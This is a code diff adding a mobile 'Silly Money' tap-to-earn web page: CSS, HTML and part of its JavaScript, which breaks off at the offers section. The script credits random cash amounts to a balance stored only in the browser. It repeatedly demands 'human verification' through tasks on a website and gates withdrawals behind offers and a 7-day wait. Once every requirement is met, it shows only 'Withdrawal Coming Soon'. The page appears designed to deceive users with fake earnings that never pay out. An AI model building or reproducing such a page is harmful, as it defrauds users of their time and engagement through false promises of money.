@@ -59,6 +59,1430 @@
             gap: 8px;
         }
 
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .refresh-btn {
+            background: rgba(255,255,255,0.2);
+            border: none;
+            color: white;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1rem;
+            cursor: pointer;
+            touch-action: manipulation;
+            backdrop-filter: blur(10px);
+        }
+
+        .refresh-btn:active {
+            transform: scale(0.9);
+            background: rgba(255,255,255,0.3);
+        }
+
+        .refresh-btn.spinning {
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .balance-pill {
+            background: rgba(255,255,255,0.2);
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 0.9rem;
+        }
+
+        .main {
+            flex: 1;
+            overflow-y: auto;
+            overflow-x: hidden;
+            -webkit-overflow-scrolling: touch;
+            padding: 12px;
+            padding-bottom: 100px;
+        }
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .warning-box {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
+            color: white;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 12px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .stats-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        .stat-card {
+            background: white;
+            padding: 14px;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+            border-left: 4px solid #3a36e0;
+        }
+
+        .stat-label {
+            font-size: 0.7rem;
+            color: #6c757d;
+            text-transform: uppercase;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .stat-value {
+            font-size: 1.3rem;
+            font-weight: 800;
+            color: #121826;
+        }
+
+        .clicker-box {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 16px;
+            padding: 20px;
+            text-align: center;
+            color: white;
+            margin-bottom: 12px;
+            position: relative;
+            touch-action: manipulation;
+        }
+
+        .level-tag {
+            display: inline-block;
+            background: rgba(255,255,255,0.2);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .xp-bar-bg {
+            background: rgba(0,0,0,0.2);
+            height: 10px;
+            border-radius: 5px;
+            margin: 12px 0;
+            overflow: hidden;
+        }
+
+        .xp-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ffd700, #ffed4e);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+        }
+
+        .tap-btn {
+            width: 140px;
+            height: 140px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 30% 30%, #ff6b6b, #ee5a6f);
+            border: none;
+            color: white;
+            font-size: 1.2rem;
+            font-weight: 800;
+            margin: 15px auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            box-shadow: 0 10px 30px rgba(238, 90, 111, 0.4), inset 0 -5px 10px rgba(0,0,0,0.1);
+            cursor: pointer;
+            position: relative;
+            touch-action: manipulation;
+            -webkit-tap-highlight-color: rgba(255,255,255,0.3);
+        }
+
+        .tap-btn:active {
+            transform: scale(0.9);
+            box-shadow: 0 5px 15px rgba(238, 90, 111, 0.4);
+        }
+
+        .tap-btn i {
+            font-size: 1.8rem;
+        }
+
+        .floating-text {
+            position: fixed;
+            color: #ffd700;
+            font-weight: 800;
+            font-size: 1.3rem;
+            pointer-events: none;
+            z-index: 9999;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+            animation: floatUp 0.8s ease-out forwards;
+        }
+
+        @keyframes floatUp {
+            0% { transform: translateY(0) scale(1); opacity: 1; }
+            100% { transform: translateY(-100px) scale(1.2); opacity: 0; }
+        }
+
+        .card {
+            background: white;
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 12px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+        }
+
+        .offer-card {
+            background: white;
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 10px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+            border: 2px solid transparent;
+            position: relative;
+            cursor: pointer;
+            touch-action: manipulation;
+        }
+
+        .offer-card.active {
+            border-color: #10b981;
+            background: linear-gradient(135deg, #f0fff4 0%, #ffffff 100%);
+        }
+
+        .offer-card.active:active {
+            transform: scale(0.98);
+            background: #e6f7ed;
+        }
+
+        .offer-card.locked {
+            opacity: 0.6;
+            background: #f8f9fa;
+            pointer-events: none;
+        }
+
+        .offer-card.completed {
+            border-color: #10b981;
+            background: #f0fff4;
+        }
+
+        .offer-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .offer-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.4rem;
+            color: white;
+            background: #3a36e0;
+            flex-shrink: 0;
+        }
+
+        .offer-card.active .offer-icon {
+            background: #10b981;
+            animation: glow 2s infinite;
+        }
+
+        @keyframes glow {
+            0%, 100% { box-shadow: 0 0 5px rgba(16, 185, 129, 0.5); }
+            50% { box-shadow: 0 0 20px rgba(16, 185, 129, 0.8); }
+        }
+
+        .offer-info {
+            flex: 1;
+        }
+
+        .offer-title {
+            font-weight: 700;
+            font-size: 1.1rem;
+            margin-bottom: 2px;
+        }
+
+        .offer-desc {
+            font-size: 0.8rem;
+            color: #6c757d;
+        }
+
+        .offer-reward {
+            text-align: right;
+        }
+
+        .reward-big {
+            font-size: 1.6rem;
+            font-weight: 800;
+            color: #10b981;
+        }
+
+        .hot-tag {
+            position: absolute;
+            top: 0;
+            right: 0;
+            background: #ff6b6b;
+            color: white;
+            padding: 4px 12px;
+            font-size: 0.65rem;
+            font-weight: 800;
+            border-bottom-left-radius: 12px;
+        }
+
+        .balance-display {
+            background: linear-gradient(135deg, #121826 0%, #2d3748 100%);
+            color: white;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+
+        .balance-label {
+            font-size: 0.8rem;
+            opacity: 0.8;
+            margin-bottom: 5px;
+        }
+
+        .balance-amount-big {
+            font-size: 2.2rem;
+            font-weight: 800;
+            margin-bottom: 15px;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            background: #10b981;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            touch-action: manipulation;
+        }
+
+        .btn-primary:disabled {
+            background: #6c757d;
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .btn-primary:active:not(:disabled) {
+            transform: scale(0.98);
+        }
+
+        .btn-soon {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: default;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .soon-badge {
+            background: rgba(255,255,255,0.3);
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 0.7rem;
+            text-transform: uppercase;
+        }
+
+        .spin-box {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            border-radius: 16px;
+            padding: 20px;
+            text-align: center;
+            color: white;
+            margin-bottom: 12px;
+        }
+
+        .spin-btn {
+            background: white;
+            color: #f5576c;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-weight: 700;
+            font-size: 0.95rem;
+            margin-top: 10px;
+            cursor: pointer;
+            touch-action: manipulation;
+        }
+
+        .spin-btn:disabled {
+            opacity: 0.6;
+        }
+
+        .rewards-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        .reward-box {
+            background: white;
+            border-radius: 12px;
+            padding: 16px 10px;
+            text-align: center;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+            cursor: pointer;
+            border: 2px solid transparent;
+            touch-action: manipulation;
+        }
+
+        .reward-box:active {
+            transform: scale(0.95);
+            border-color: #3a36e0;
+        }
+
+        .reward-icon {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            margin: 0 auto 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.3rem;
+            color: white;
+        }
+
+        .nav-bar {
+            background: white;
+            display: flex;
+            justify-content: space-around;
+            padding: 8px 0 max(8px, env(safe-area-inset-bottom));
+            box-shadow: 0 -4px 20px rgba(0,0,0,0.08);
+            border-top-left-radius: 20px;
+            border-top-right-radius: 20px;
+            flex-shrink: 0;
+        }
+
+        .nav-btn {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            padding: 8px 20px;
+            border-radius: 12px;
+            color: #6c757d;
+            font-size: 0.7rem;
+            font-weight: 600;
+            cursor: pointer;
+            touch-action: manipulation;
+        }
+
+        .nav-btn.active {
+            color: #3a36e0;
+            background: rgba(58, 54, 224, 0.1);
+        }
+
+        .nav-btn i {
+            font-size: 1.4rem;
+        }
+
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 1000;
+            align-items: flex-end;
+            justify-content: center;
+        }
+
+        .modal-overlay.show {
+            display: flex;
+        }
+
+        .modal-sheet {
+            background: white;
+            width: 100%;
+            max-width: 480px;
+            border-radius: 20px 20px 0 0;
+            padding: 20px;
+            padding-bottom: max(20px, env(safe-area-inset-bottom));
+            max-height: 90vh;
+            overflow-y: auto;
+            animation: slideUp 0.3s ease;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(100%); }
+            to { transform: translateY(0); }
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .modal-title {
+            font-size: 1.1rem;
+            font-weight: 700;
+        }
+
+        .close-btn {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            border: none;
+            background: #f0f2f5;
+            color: #6c757d;
+            font-size: 1.2rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            touch-action: manipulation;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #e9ecef;
+            border-top-color: #3a36e0;
+            border-radius: 50%;
+            animation: spinAnim 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spinAnim {
+            to { transform: rotate(360deg); }
+        }
+
+        .verify-btn {
+            width: 100%;
+            padding: 16px;
+            background: #3a36e0;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 1rem;
+            margin-top: 15px;
+            cursor: pointer;
+            touch-action: manipulation;
+        }
+
+        .verify-btn:disabled {
+            background: #6c757d;
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .toast {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.9);
+            background: rgba(0,0,0,0.9);
+            color: white;
+            padding: 16px 24px;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            opacity: 0;
+            transition: all 0.3s;
+            z-index: 2000;
+            pointer-events: none;
+            text-align: center;
+            max-width: 85%;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translate(-50%, -50%) scale(1);
+        }
+
+        .toast.success { background: #10b981; }
+        .toast.error { background: #ef4444; }
+
+        .progress-bar {
+            background: #e9ecef;
+            height: 6px;
+            border-radius: 3px;
+            overflow: hidden;
+            margin-top: 8px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: #3a36e0;
+            width: 0%;
+            transition: width 0.3s;
+        }
+
+        .timer-display {
+            font-size: 0.75rem;
+            color: #6c757d;
+            margin-top: 8px;
+            font-weight: 600;
+        }
+
+        .warning-text {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 8px;
+            font-size: 0.8rem;
+            color: #856404;
+        }
+
+        .rare-hit {
+            color: #ff6b6b;
+            font-size: 1.5rem;
+            font-weight: 800;
+            text-shadow: 0 0 10px rgba(255, 107, 107, 0.5);
+        }
+
+        .coming-soon-box {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 12px;
+            padding: 15px;
+            margin-top: 15px;
+            color: white;
+            text-align: center;
+        }
+
+        .coming-soon-box i {
+            font-size: 2rem;
+            margin-bottom: 8px;
+            opacity: 0.9;
+        }
+
+        .coming-soon-box h4 {
+            font-size: 1rem;
+            margin-bottom: 5px;
+        }
+
+        .coming-soon-box p {
+            font-size: 0.8rem;
+            opacity: 0.9;
+        }
+    </style>
+</head>
+<body>
+
+<div id="app">
+    <div class="header">
+        <div class="logo">
+            <i class="fas fa-coins"></i>
+            <span>Silly Money</span>
+        </div>
+        <div class="header-actions">
+            <button class="refresh-btn" id="refreshBtn" onclick="refreshSite()" title="Refresh">
+                <i class="fas fa-sync-alt"></i>
+            </button>
+            <div class="balance-pill">
+                $<span id="headerBalance">0.00</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="main" id="mainContent">
+        <!-- HOME PAGE -->
+        <div class="page active" id="pageHome">
+            <div class="warning-box">
+                <i class="fas fa-exclamation-triangle"></i>
+                <span>Task skipping = Permanent ban!</span>
+            </div>
+
+            <div class="stats-row">
+                <div class="stat-card">
+                    <div class="stat-label">Level</div>
+                    <div class="stat-value" id="levelDisplay">1</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Best Click</div>
+                    <div class="stat-value" id="bestDisplay">$0.00</div>
+                </div>
+            </div>
+
+            <div class="clicker-box" id="clickerBox">
+                <div class="level-tag">LEVEL <span id="levelBadge">1</span></div>
+                <h2 style="font-size: 1.4rem; margin-bottom: 5px;">Tap to Earn</h2>
+                <p style="font-size: 0.8rem; opacity: 0.9; margin-bottom: 10px;">Max $0.90 per click | Rare: $0.90</p>
+                
+                <div class="xp-bar-bg">
+                    <div class="xp-bar-fill" id="xpBar"></div>
+                </div>
+                <div style="font-size: 0.8rem; margin-bottom: 10px;">
+                    $<span id="currentXP">0.00</span> / $<span id="targetXP">5.00</span>
+                </div>
+
+                <button class="tap-btn" id="tapButton">
+                    <i class="fas fa-hand-pointer"></i>
+                    <span>TAP!</span>
+                </button>
+                
+                <div style="font-size: 0.7rem; opacity: 0.8; margin-top: 5px;">
+                    <i class="fas fa-lock"></i> Verification required per level
+                </div>
+            </div>
+
+            <div class="card">
+                <h3 style="font-size: 1rem; margin-bottom: 12px;"><i class="fas fa-chart-line" style="color: #3a36e0;"></i> Stats</h3>
+                <div style="display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee;">
+                    <span style="color: #6c757d; font-size: 0.85rem;">Total Clicks</span>
+                    <strong id="totalClicks">0</strong>
+                </div>
+                <div style="display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee;">
+                    <span style="color: #6c757d; font-size: 0.85rem;">Total Earned</span>
+                    <strong style="color: #10b981;">$<span id="totalEarned">0.00</span></strong>
+                </div>
+                <div style="display: flex; justify-content: space-between; padding: 10px 0;">
+                    <span style="color: #6c757d; font-size: 0.85rem;">Coins</span>
+                    <strong style="color: #f59e0b;"><span id="coinsDisplay">0</span> <i class="fas fa-coins"></i></strong>
+                </div>
+            </div>
+        </div>
+
+        <!-- EARN PAGE -->
+        <div class="page" id="pageEarn">
+            <div class="card" style="margin-bottom: 15px;">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                    <span style="font-size: 0.9rem; color: #6c757d;">Progress</span>
+                    <strong style="color: #3a36e0;"><span id="tasksDone">0</span>/3 Offers</strong>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressBar"></div>
+                </div>
+            </div>
+
+            <div class="offer-card active" id="offer1" data-offer="1" data-reward="5">
+                <div class="hot-tag">HOT</div>
+                <div class="offer-header">
+                    <div class="offer-icon"><i class="fas fa-bolt"></i></div>
+                    <div class="offer-info">
+                        <div class="offer-title">Starter Offer</div>
+                        <div class="offer-desc">Complete tasks to earn</div>
+                    </div>
+                    <div class="offer-reward">
+                        <div class="reward-big">$5</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="offer-card locked" id="offer2" data-offer="2" data-reward="10">
+                <div class="offer-header">
+                    <div class="offer-icon" style="background: #f59e0b;"><i class="fas fa-layer-group"></i></div>
+                    <div class="offer-info">
+                        <div class="offer-title">Premium Offer</div>
+                        <div class="offer-desc">Unlock after Offer 1</div>
+                    </div>
+                    <div class="offer-reward">
+                        <div class="reward-big" style="color: #f59e0b;">$10</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="offer-card locked" id="offer3" data-offer="3" data-reward="15">
+                <div class="offer-header">
+                    <div class="offer-icon" style="background: #ef4444;"><i class="fas fa-crown"></i></div>
+                    <div class="offer-info">
+                        <div class="offer-title">Elite Offer</div>
+                        <div class="offer-desc">Unlock after Offer 2</div>
+                    </div>
+                    <div class="offer-reward">
+                        <div class="reward-big" style="color: #ef4444;">$15</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- REWARDS PAGE -->
+        <div class="page" id="pageRewards">
+            <div class="balance-display">
+                <div class="balance-label">Available Balance</div>
+                <div class="balance-amount-big">$<span id="mainBalance">0.00</span></div>
+                
+                <!-- Show either Withdraw button (locked) or Coming Soon button (unlocked) -->
+                <div id="withdrawContainer">
+                    <button class="btn-primary" id="withdrawBtn" disabled>
+                        <i class="fas fa-lock"></i> <span id="withdrawText">Locked</span>
+                    </button>
+                </div>
+                
+                <div style="margin-top: 12px; font-size: 0.75rem; opacity: 0.8;">
+                    <span id="requirementsText">Need: $50 min • 3 offers • 7 days</span>
+                </div>
+                
+                <!-- Coming Soon notice (hidden by default) -->
+                <div class="coming-soon-box" id="comingSoonBox" style="display: none;">
+                    <i class="fas fa-rocket"></i>
+                    <h4>Withdrawal Unlocked!</h4>
+                    <p>Coming Soon - We're preparing your payout system</p>
+                </div>
+            </div>
+
+            <div class="spin-box">
+                <i class="fas fa-gift" style="font-size: 2rem; margin-bottom: 8px;"></i>
+                <h3 style="font-size: 1.1rem; margin-bottom: 5px;">Daily Free Spin</h3>
+                <p style="font-size: 0.8rem; opacity: 0.9; margin-bottom: 10px;">Win 10-100 coins!</p>
+                <button class="spin-btn" id="spinBtn">Spin Now</button>
+                <div class="timer-display" id="spinTimer" style="display: none;"></div>
+            </div>
+
+            <div class="card">
+                <h3 style="font-size: 1rem; margin-bottom: 12px;"><i class="fas fa-gift" style="color: #ef4444;"></i> Redeem Coins</h3>
+                <div class="rewards-grid">
+                    <div class="reward-box" id="rew1" data-cost="5000" data-name="$5 PayPal">
+                        <div class="reward-icon" style="background: #003087;"><i class="fab fa-paypal"></i></div>
+                        <div style="font-weight: 700; font-size: 0.85rem;">$5 PayPal</div>
+                        <div style="color: #f59e0b; font-size: 0.75rem; font-weight: 700;">5,000 coins</div>
+                    </div>
+                    <div class="reward-box" id="rew2" data-cost="8000" data-name="$10 Steam">
+                        <div class="reward-icon" style="background: #1b2838;"><i class="fab fa-steam"></i></div>
+                        <div style="font-weight: 700; font-size: 0.85rem;">$10 Steam</div>
+                        <div style="color: #f59e0b; font-size: 0.75rem; font-weight: 700;">8,000 coins</div>
+                    </div>
+                    <div class="reward-box" id="rew3" data-cost="15000" data-name="$20 Amazon">
+                        <div class="reward-icon" style="background: #FF9900;"><i class="fab fa-amazon"></i></div>
+                        <div style="font-weight: 700; font-size: 0.85rem;">$20 Amazon</div>
+                        <div style="color: #f59e0b; font-size: 0.75rem; font-weight: 700;">15,000 coins</div>
+                    </div>
+                    <div class="reward-box" id="rew4" data-cost="45000" data-name="$50 Visa">
+                        <div class="reward-icon" style="background: #1A1F71;"><i class="fab fa-cc-visa"></i></div>
+                        <div style="font-weight: 700; font-size: 0.85rem;">$50 Visa</div>
+                        <div style="color: #f59e0b; font-size: 0.75rem; font-weight: 700;">45,000 coins</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="nav-bar">
+        <div class="nav-btn active" data-page="home">
+            <i class="fas fa-home"></i>
+            <span>Home</span>
+        </div>
+        <div class="nav-btn" data-page="earn">
+            <i class="fas fa-tasks"></i>
+            <span>Earn</span>
+        </div>
+        <div class="nav-btn" data-page="rewards">
+            <i class="fas fa-gift"></i>
+            <span>Rewards</span>
+        </div>
+    </div>
+</div>
+
+<!-- CAPTCHA Modal -->
+<div class="modal-overlay" id="captchaModal">
+    <div class="modal-sheet">
+        <div class="modal-header">
+            <div class="modal-title"><i class="fas fa-shield-alt" style="color: #3a36e0;"></i> Human Verification</div>
+        </div>
+        
+        <div class="warning-text">
+            <i class="fas fa-exclamation-triangle"></i> <strong>Important:</strong> You must complete tasks on the website to verify you're human.
+        </div>
+
+        <div data-captcha-enable="true"></div>
+        
+        <button class="verify-btn" id="captchaBtn" disabled>
+            <i class="fas fa-lock"></i> Complete Verification
+        </button>
+    </div>
+</div>
+
+<!-- Timer Modal -->
+<div class="modal-overlay" id="timerModal">
+    <div class="modal-sheet">
+        <div class="modal-header">
+            <div class="modal-title"><i class="fas fa-clock" style="color: #3a36e0;"></i> Verifying Tasks</div>
+        </div>
+        
+        <div style="text-align: center; padding: 20px;">
+            <div class="spinner"></div>
+            <p style="font-size: 0.9rem; color: #495057; margin-bottom: 10px;">
+                <i class="fas fa-tasks"></i> Complete tasks on the website
+            </p>
+            <p style="font-size: 0.8rem; color: #6c757d;">
+                Stay on this screen. Do not close.
+            </p>
+            <div class="warning-text" style="margin-top: 15px;">
+                <i class="fas fa-exclamation-circle"></i> Leaving early = NO reward
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Claim Modal -->
+<div class="modal-overlay" id="claimModal">
+    <div class="modal-sheet">
+        <div class="modal-header">
+            <div class="modal-title"><i class="fas fa-check-circle" style="color: #10b981;"></i> Ready to Claim!</div>
+        </div>
+        
+        <div style="text-align: center; padding: 20px;">
+            <i class="fas fa-gift" style="font-size: 3rem; color: #10b981; margin-bottom: 15px;"></i>
+            <h3 style="font-size: 1.3rem; margin-bottom: 10px;">$<span id="claimAmount">0</span> Reward</h3>
+            <p style="font-size: 0.85rem; color: #6c757d; margin-bottom: 20px;">
+                Your tasks have been verified!
+            </p>
+            <button class="btn-primary" id="claimBtn" style="background: #10b981;">
+                <i class="fas fa-download"></i> Claim Reward
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- Withdraw Coming Soon Modal -->
+<div class="modal-overlay" id="soonModal">
+    <div class="modal-sheet">
+        <div class="modal-header">
+            <div class="modal-title"><i class="fas fa-rocket" style="color: #f5576c;"></i> Almost There!</div>
+            <button class="close-btn" onclick="closeModal('soonModal')"><i class="fas fa-times"></i></button>
+        </div>
+        
+        <div style="text-align: center; padding: 30px 20px;">
+            <i class="fas fa-rocket" style="font-size: 4rem; color: #f5576c; margin-bottom: 20px;"></i>
+            <h3 style="font-size: 1.4rem; margin-bottom: 15px; color: #121826;">Withdrawal Coming Soon!</h3>
+            <p style="font-size: 0.9rem; color: #6c757d; margin-bottom: 20px; line-height: 1.5;">
+                Congratulations! You've completed all requirements and unlocked withdrawals. 
+                We're currently preparing the payout system for you.
+            </p>
+            <div style="background: #f0f7ff; padding: 15px; border-radius: 12px; margin-bottom: 20px;">
+                <div style="font-size: 0.8rem; color: #3a36e0; font-weight: 600; margin-bottom: 5px;">
+                    <i class="fas fa-check-circle"></i> Requirements Met
+                </div>
+                <div style="font-size: 0.75rem; color: #6c757d;">
+                    $50+ earned • All offers completed • Account aged 7+ days
+                </div>
+            </div>
+            <button class="btn-primary" onclick="closeModal('soonModal')" style="background: #f5576c;">
+                <i class="fas fa-bell"></i> Notify Me When Ready
+            </button>
+        </div>
+    </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// State Management
+const state = {
+    balance: parseFloat(localStorage.getItem('smb_balance')) || 0,
+    coins: parseInt(localStorage.getItem('smb_coins')) || 0,
+    level: parseInt(localStorage.getItem('smb_level')) || 1,
+    xp: parseFloat(localStorage.getItem('smb_xp')) || 0,
+    targetXP: 5,
+    clicks: parseInt(localStorage.getItem('smb_clicks')) || 0,
+    best: parseFloat(localStorage.getItem('smb_best')) || 0,
+    earned: parseFloat(localStorage.getItem('smb_earned')) || 0,
+    offers: JSON.parse(localStorage.getItem('smb_offers')) || {1: false, 2: false, 3: false},
+    offerClaimed: JSON.parse(localStorage.getItem('smb_claimed')) || {1: false, 2: false, 3: false},
+    lastSpin: localStorage.getItem('smb_spin') || null,
+    created: localStorage.getItem('smb_created') || new Date().toISOString(),
+    currentOffer: null,
+    withdrawalUnlocked: localStorage.getItem('smb_withdrawUnlock') === 'true'
+};
+
+function save() {
+    localStorage.setItem('smb_balance', state.balance);
+    localStorage.setItem('smb_coins', state.coins);
+    localStorage.setItem('smb_level', state.level);
+    localStorage.setItem('smb_xp', state.xp);
+    localStorage.setItem('smb_clicks', state.clicks);
+    localStorage.setItem('smb_best', state.best);
+    localStorage.setItem('smb_earned', state.earned);
+    localStorage.setItem('smb_offers', JSON.stringify(state.offers));
+    localStorage.setItem('smb_claimed', JSON.stringify(state.offerClaimed));
+    localStorage.setItem('smb_created', state.created);
+    localStorage.setItem('smb_withdrawUnlock', state.withdrawalUnlocked);
+}
+
+// Refresh Function
+function refreshSite() {
+    const btn = document.getElementById('refreshBtn');
+    btn.classList.add('spinning');
+    save();
+    setTimeout(() => {
+        window.location.reload();
+    }, 500);
+}
+
+// Navigation
+document.querySelectorAll('.nav-btn').forEach(btn => {
+    btn.addEventListener('click', function() {
+        const page = this.dataset.page;
+        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        this.classList.add('active');
+        document.getElementById('page' + page.charAt(0).toUpperCase() + page.slice(1)).classList.add('active');
+        if (page === 'earn') updateOffers();
+        if (page === 'rewards') checkWithdrawalStatus();
+    });
+});
+
+// CLICKER with new reward system
+const tapBtn = document.getElementById('tapButton');
+const clickerBox = document.getElementById('clickerBox');
+
+function doClick(e) {
+    e.preventDefault();
+    e.stopPropagation();
+    
+    let reward;
+    const r = Math.random();
+    
+    // 0.5% chance for max $0.90 (SUPER RARE)
+    if (r > 0.995) {
+        reward = 0.90;
+        showToast('MEGA HIT! $0.90!', 'success');
+    }
+    // 4.5% chance for $0.80-$0.89 (RARE)
+    else if (r > 0.95) {
+        reward = 0.80 + (Math.random() * 0.09);
+        showToast('RARE! $' + reward.toFixed(2), 'success');
+    }
+    // 15% chance for $0.40-$0.79
+    else if (r > 0.80) {
+        reward = 0.40 + (Math.random() * 0.39);
+    }
+    // 80% chance for $0.01-$0.39 (common)
+    else {
+        reward = 0.01 + (Math.random() * 0.38);
+    }
+    
+    reward = Math.round(reward * 100) / 100;
+    
+    // Update state
+    state.balance += reward;
+    state.xp += reward;
+    state.clicks++;
+    state.earned += reward;
+    
+    // Update best click if this is higher
+    if (reward > state.best) {
+        state.best = reward;
+    }
+    
+    // Visual feedback
+    const float = document.createElement('div');
+    float.className = 'floating-text';
+    
+    // Special styling for rare hits
+    if (reward >= 0.80) {
+        float.className += ' rare-hit';
+        float.innerHTML = '$' + reward.toFixed(2) + ' <i class="fas fa-star"></i>';
+    } else {
+        float.textContent = '+$' + reward.toFixed(2);
+    }
+    
+    const rect = tapBtn.getBoundingClientRect();
+    const centerX = rect.left + rect.width / 2;
+    const centerY = rect.top + rect.height / 2;
+    
+    float.style.left = (centerX - 40 + (Math.random() * 40 - 20)) + 'px';
+    float.style.top = (centerY - 50) + 'px';
+    document.body.appendChild(float);
+    
+    setTimeout(() => float.remove(), 800);
+    
+    // Haptic feedback
+    if (navigator.vibrate) navigator.vibrate(reward >= 0.80 ? 100 : 50);
+    
+    save();
+    updateUI();
+    
+    // Check level up
+    if (state.xp >= state.targetXP) {
+        setTimeout(showCaptcha, 500);
+    }
+    
+    return false;
+}
+
+// Multiple event listeners for maximum compatibility
+tapBtn.addEventListener('touchstart', doClick, {passive: false});
+tapBtn.addEventListener('mousedown', doClick);
+tapBtn.addEventListener('click', doClick);
+
+clickerBox.addEventListener('touchstart', function(e) {
+    if (e.target === clickerBox || e.target.closest('.clicker-box') === clickerBox) {
+        if (e.target !== tapBtn && !tapBtn.contains(e.target)) {
+            doClick(e);
+        }
+    }
+}, {passive: false});
+
+// CAPTCHA
+function showCaptcha() {
+    document.getElementById('captchaBtn').disabled = true;
+    document.getElementById('captchaBtn').innerHTML = '<i class="fas fa-lock"></i> Complete Verification';
+    document.getElementById('captchaModal').classList.add('show');
+    
+    setTimeout(() => {
+        document.getElementById('captchaBtn').disabled = false;
+        document.getElementById('captchaBtn').innerHTML = '<i class="fas fa-check-circle"></i> Verify & Continue';
+    }, 3000);
+}
+
+document.getElementById('captchaBtn').addEventListener('click', function() {
+    if (this.disabled) return;
+    
+    state.level++;
+    state.xp = 0;
+    state.targetXP = state.level * 5;
+    
+    closeModal('captchaModal');
+    showToast('Level ' + state.level + ' Unlocked!', 'success');
+    save();
+    updateUI();
+});
+
+// OFFERS
